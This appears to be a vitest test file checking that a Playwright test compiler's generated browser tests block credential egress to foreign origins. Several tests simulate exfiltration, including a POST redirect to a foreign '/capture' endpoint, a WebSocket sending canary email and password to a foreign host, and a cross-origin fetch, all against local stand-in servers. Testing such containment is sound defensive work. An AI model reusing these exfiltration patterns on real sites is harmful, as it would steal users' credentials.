import { execFile } from 'node:child_process';
import { createServer, type Server } from 'node:http';
import { mkdir, mkdtemp, readFile, rm, symlink, writeFile } from 'node:fs/promises';
import { createRequire } from 'node:module';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { promisify } from 'node:util';
import type { EvidenceRef, Workflow } from '@arxic/contracts';
import { afterEach, expect, test } from 'vitest';
import { PlaywrightCompiler } from '../compiler';

const execute = promisify(execFile);
const require = createRequire(import.meta.url);
const cleanups: Array<() => Promise<void>> = [];

afterEach(async () => {
  await Promise.all(cleanups.splice(0).map((cleanup) => cleanup()));
});

test.each([302, 303, 307, 308])(
  'real Chromium blocks a %i credential-bearing POST redirect without leaking canaries to the foreign origin',
  async (redirectStatus) => {
    const foreignRequests: string[] = [];
    const foreignBytes: Buffer[] = [];
    const foreign = createServer((request, response) => {
      foreignRequests.push(`${request.method} ${request.url}`);
      request.on('data', (chunk: Buffer) => foreignBytes.push(chunk));
      response.end('foreign');
    });
    const foreignOrigin = await listen(foreign);
    const approvedPosts: Buffer[] = [];
    const approved = createServer((request, response) => {
      if (request.method === 'POST') {
        request.on('data', (chunk: Buffer) => approvedPosts.push(chunk));
        request.on('end', () => {
          response.writeHead(redirectStatus, { location: `${foreignOrigin}/capture` });
          response.end();
        });
        return;
      }
      response.writeHead(200, { 'content-type': 'text/html' });
      response.end(`<!doctype html><form method="post" action="/login">
      <label>Email <input name="email" /></label>
      <label>Password <input name="password" type="password" /></label>
      <button type="submit">Log in</button>
    </form>`);
    });
    const approvedOrigin = await listen(approved);
    const directory = await mkdtemp(join(tmpdir(), 'arxic-egress-redirect-'));
    cleanups.push(() => rm(directory, { recursive: true }));

    await new PlaywrightCompiler({ outputDirectory: directory, origin: approvedOrigin }).compile(
      loginWorkflow(),
      observations(`${approvedOrigin}/login`),
    );
    await ensurePlaywrightModule(directory);
    let output = '';
    try {
      await execute(process.execPath, [resolvePlaywrightCli(), 'test'], {
        cwd: directory,
        env: {
          ...process.env,
          ARXIC_INPUT_PERSONA_EMAIL: 'egress-canary@example.test',
          ARXIC_INPUT_PERSONA_PASSWORD: 'EgressCanary9!',
        },
        timeout: 120_000,
      });
    } catch (error) {
      const failure = error as { stdout?: string; stderr?: string };
      output = `${failure.stdout ?? ''}${failure.stderr ?? ''}`;
    }

    expect(output).toContain('ARXIC-COMPILE-ORIGIN-DENIED');
    expect(foreignRequests).toEqual([]);
    const approvedPostBody = Buffer.concat(approvedPosts).toString('utf8');
    expect(approvedPostBody).toContain('egress-canary%40example.test');
    expect(approvedPostBody).toContain('EgressCanary9%21');
    const leakedForeignBytes = Buffer.concat(foreignBytes).toString('utf8');
    expect(leakedForeignBytes).not.toContain('egress-canary@example.test');
    expect(leakedForeignBytes).not.toContain('EgressCanary9!');
  },
  120_000,
);

test('real Chromium blocks foreign WebSocket egress after credential canaries are filled', async () => {
  const emailCanary = 'websocket-canary@example.test';
  const passwordCanary = 'WebSocketCanary9!';
  let foreignConnections = 0;
  const foreignBytes: Buffer[] = [];
  const foreign = createServer();
  foreign.on('upgrade', (_request, socket, head) => {
    foreignConnections += 1;
    foreignBytes.push(head);
    socket.on('data', (chunk: Buffer) => foreignBytes.push(chunk));
    socket.destroy();
  });
  const foreignOrigin = await listen(foreign);
  const foreignWebSocketOrigin = foreignOrigin.replace(/^http/u, 'ws');
  const approved = createServer((_request, response) => {
    response.writeHead(200, { 'content-type': 'text/html' });
    response.end(`<!doctype html>
      <label>Email <input aria-label="Email" /></label>
      <label>Password <input aria-label="Password" type="password" /></label>`);
  });
  const approvedOrigin = await listen(approved);
  const directory = await mkdtemp(join(tmpdir(), 'arxic-egress-websocket-'));
  cleanups.push(() => rm(directory, { recursive: true }));

  await new PlaywrightCompiler({ outputDirectory: directory, origin: approvedOrigin }).compile(
    loginWorkflow(),
    observations(`${approvedOrigin}/login`),
  );
  await ensurePlaywrightModule(directory);
  await writeFile(
    join(directory, 'tests/workflow.spec.ts'),
    `import { test, expect, configureApprovedOrigins, enforceNetworkContainment } from '../fixtures/workflow.fixture';
configureApprovedOrigins([${JSON.stringify(approvedOrigin)}]);
test('websocket credential egress', async ({ page, context }) => {
  await page.goto(${JSON.stringify(`${approvedOrigin}/login`)});
  await page.getByLabel('Email').fill(process.env.ARXIC_INPUT_PERSONA_EMAIL ?? '');
  await page.getByLabel('Password').fill(process.env.ARXIC_INPUT_PERSONA_PASSWORD ?? '');
  await expect(enforceNetworkContainment(page, () => page.evaluate(({ url, email, password }) => new Promise((resolve) => {
    const socket = new WebSocket(url);
    socket.addEventListener('open', () => { socket.send(JSON.stringify({ email, password })); resolve('opened'); });
    socket.addEventListener('close', () => resolve('closed'));
    socket.addEventListener('error', () => resolve('error'));
  }), { url: ${JSON.stringify(`${foreignWebSocketOrigin}/capture`)}, email: process.env.ARXIC_INPUT_PERSONA_EMAIL, password: process.env.ARXIC_INPUT_PERSONA_PASSWORD }))).rejects.toThrow('ARXIC-COMPILE-ORIGIN-DENIED');
});
`,
  );

  let output = '';
  try {
    await execute(process.execPath, [resolvePlaywrightCli(), 'test'], {
      cwd: directory,
      env: {
        ...process.env,
        ARXIC_INPUT_PERSONA_EMAIL: emailCanary,
        ARXIC_INPUT_PERSONA_PASSWORD: passwordCanary,
      },
      timeout: 120_000,
    });
  } catch (error) {
    const failure = error as { stdout?: string; stderr?: string };
    output = `${failure.stdout ?? ''}${failure.stderr ?? ''}`;
  }

  expect(output).toContain('ARXIC-COMPILE-ORIGIN-DENIED');
  expect(foreignConnections).toBe(0);
  const leakedForeignBytes = Buffer.concat(foreignBytes).toString('utf8');
  expect(leakedForeignBytes).not.toContain(emailCanary);
  expect(leakedForeignBytes).not.toContain(passwordCanary);
}, 120_000);

test('generated policy blocks service workers and intercepts every request hop', async () => {
  const directory = await mkdtemp(join(tmpdir(), 'arxic-egress-source-'));
  cleanups.push(() => rm(directory, { recursive: true }));
  await new PlaywrightCompiler({
    outputDirectory: directory,
    origin: 'http://127.0.0.1:3000',
  }).compile(loginWorkflow(), observations('http://127.0.0.1:3000/login'));

  const fixture = await readFile(join(directory, 'fixtures/workflow.fixture.ts'), 'utf8');
  const config = await readFile(join(directory, 'playwright.config.ts'), 'utf8');
  expect(fixture).toContain("await context.route('**/*', async (route) => {");
  expect(fixture).toContain('await route.continue()');
  expect(fixture).not.toContain('route.fallback()');
  expect(fixture.match(/context\.route\('\*\*\/\*'/gu)).toHaveLength(1);
  expect(fixture).toContain(
    "session.send('Fetch.enable', { patterns: [{ requestStage: 'Response' }] })",
  );
  expect(fixture).toContain(
    "session.send('Fetch.continueResponse', { requestId: event.requestId })",
  );
  expect(fixture).toContain(
    "session.send('Fetch.failRequest', { requestId: event.requestId, errorReason: 'BlockedByClient' })",
  );
  expect(config).toContain("serviceWorkers: 'block'");
});

test('real Chromium blocks a page-context cross-origin fetch and service worker registration', async () => {
  const foreignRequests: string[] = [];
  const foreign = createServer((request, response) => {
    foreignRequests.push(`${request.method} ${request.url}`);
    response.end('foreign');
  });
  const foreignOrigin = await listen(foreign);
  const approved = createServer((request, response) => {
    if (request.url === '/sw.js') {
      response.writeHead(200, { 'content-type': 'text/javascript' });
      response.end("self.addEventListener('fetch', () => {});");
      return;
    }
    response.writeHead(200, { 'content-type': 'text/html' });
    response.end('<main>approved</main>');
  });
  const approvedOrigin = await listen(approved);
  const directory = await mkdtemp(join(tmpdir(), 'arxic-egress-page-'));
  cleanups.push(() => rm(directory, { recursive: true }));

  await new PlaywrightCompiler({ outputDirectory: directory, origin: approvedOrigin }).compile(
    loginWorkflow(),
    observations(`${approvedOrigin}/login`),
  );
  await ensurePlaywrightModule(directory);
  await writeFile(
    join(directory, 'tests/workflow.spec.ts'),
    `import { test, expect, configureApprovedOrigins, enforceNetworkContainment } from '../fixtures/workflow.fixture';
configureApprovedOrigins([${JSON.stringify(approvedOrigin)}]);
test('page egress', async ({ page, context }) => {
  await page.goto(${JSON.stringify(approvedOrigin)});
  await page.evaluate(() => navigator.serviceWorker.register('/sw.js').catch(() => undefined));
  await expect(page.evaluate(() => navigator.serviceWorker.getRegistrations().then((items) => items.length))).resolves.toBe(0);
  await expect(enforceNetworkContainment(page, () => page.evaluate(() => fetch(${JSON.stringify(`${foreignOrigin}/capture`)})))).rejects.toThrow('ARXIC-COMPILE-ORIGIN-DENIED');
});
`,
  );

  let output = '';
  try {
    await execute(process.execPath, [resolvePlaywrightCli(), 'test'], {
      cwd: directory,
      timeout: 120_000,
    });
  } catch (error) {
    const failure = error as { stdout?: string; stderr?: string };
    output = `${failure.stdout ?? ''}${failure.stderr ?? ''}`;
  }
  expect(output).toContain('ARXIC-COMPILE-ORIGIN-DENIED');
  expect(foreignRequests).toEqual([]);
}, 120_000);

test('real Chromium fails containment afterEach when a receipt-enabled test tolerates denied hostile egress', async () => {
  const foreign = createServer((_request, response) => response.end('foreign'));
  const foreignOrigin = await listen(foreign);
  const approved = createServer((_request, response) => {
    response.writeHead(200, { 'content-type': 'text/html' });
    response.end('<main>approved</main>');
  });
  const approvedOrigin = await listen(approved);
  const directory = await mkdtemp(join(tmpdir(), 'arxic-egress-receipt-denial-'));
  cleanups.push(() => rm(directory, { recursive: true }));
  const receiptPath = join(directory, 'artifacts', 'arxic-transition-receipts.json');
  const receiptNonce = 'receipt-denial-nonce';

  await new PlaywrightCompiler({ outputDirectory: directory, origin: approvedOrigin }).compile(
    loginWorkflow(),
    observations(`${approvedOrigin}/login`),
  );
  await ensurePlaywrightModule(directory);
  await writeFile(
    join(directory, 'tests/workflow.spec.ts'),
    `import { test, configureApprovedOrigins } from '../fixtures/workflow.fixture';
configureApprovedOrigins([${JSON.stringify(approvedOrigin)}]);
test('tolerates denied hostile egress in the body', async ({ page }) => {
  await page.goto(${JSON.stringify(approvedOrigin)});
  await page.evaluate(() => fetch(${JSON.stringify(`${foreignOrigin}/capture`)}).catch(() => undefined));
});
`,
  );

  let output = '';
  try {
    await execute(process.execPath, [resolvePlaywrightCli(), 'test'], {
      cwd: directory,
      env: {
        ...process.env,
        ARXIC_TRANSITION_RECEIPTS_PATH: receiptPath,
        ARXIC_TRANSITION_RECEIPTS_NONCE: receiptNonce,
      },
      timeout: 120_000,
    });
  } catch (error) {
    const failure = error as { stdout?: string; stderr?: string };
    output = `${failure.stdout ?? ''}${failure.stderr ?? ''}`;
  }

  // Receipt collection coexists with containment; assertNetworkContained in the generated
  // afterEach is authoritative even when the test body deliberately tolerates the abort.
  expect(output).toContain('ARXIC-COMPILE-ORIGIN-DENIED');
  await expect(readFile(receiptPath, 'utf8')).resolves.toContain('arxic-transition-receipts');
}, 120_000);

async function listen(server: Server): Promise<string> {
  await new Promise<void>((resolve, reject) => {
    server.once('error', reject);
    server.listen(0, '127.0.0.1', resolve);
  });
  cleanups.push(
    () =>
      new Promise<void>((resolve, reject) =>
        server.close((error) => (error ? reject(error) : resolve())),
      ),
  );
  const address = server.address();
  if (!address || typeof address === 'string') throw new Error('Server did not bind TCP');
  return `http://127.0.0.1:${address.port}`;
}

function resolvePlaywrightCli(): string {
  try {
    return require.resolve('@playwright/test/cli.js');
  } catch {
    return require.resolve('@playwright/test/cli');
  }
}

async function ensurePlaywrightModule(directory: string): Promise<void> {
  const packageRoot = dirname(require.resolve('@playwright/test/package.json'));
  const scope = join(directory, 'node_modules', '@playwright');
  await mkdir(scope, { recursive: true });
  await symlink(packageRoot, join(scope, 'test'), 'dir');
}

function loginWorkflow(): Workflow {
  return {
    $schema: 'https://arxic.dev/schemas/workflow/v1.json',
    id: 'authentication.credential-egress',
    version: 1,
    title: 'Credential egress containment',
    domain: 'authentication',
    persona: 'registered-user',
    status: 'observed',
    confidence: 1,
    scope: {
      commit: '0123456789abcdef0123456789abcdef01234567',
      environment: 'local-test',
      browser: 'chromium',
    },
    preconditions: [{ fixture: 'user.exists' }],
    states: [{ id: 'login-page' }, { id: 'home' }],
    transitions: [
      {
        from: 'login-page',
        to: 'home',
        action: {
          intent: 'Submit login credentials',
          inputRefs: { email: 'persona.email', password: 'persona.password' },
        },
        assertions: [{ intent: 'text:Welcome' }],
        evidenceRefs: ['src:login'],
      },
    ],
    negativeCases: [],
    verification: {
      requiredRuns: 2,
      screenshotCheckpoints: ['home'],
      forbidNetworkErrors: true,
      trace: 'discard',
    },
    evidenceRefs: ['src:login'],
  };
}

function observations(runtimeUrl: string): EvidenceRef[] {
  return [
    {
      kind: 'source',
      repo: 'https://github.com/example/app',
      commit: '0123456789abcdef0123456789abcdef01234567',
      path: 'login.ts',
      startLine: 1,
      endLine: 2,
      blobSha256: 'a'.repeat(64),
      extractor: 'credential-egress-test',
    },
    {
      kind: 'runtime',
      runId: 'credential-egress-test',
      appBuildDigest: 'b'.repeat(64),
      browser: 'chromium',
      browserVersion: '1.62.1',
      url: runtimeUrl,
      timestamp: '2026-08-13T00:00:00.000Z',
    },
  ];
}
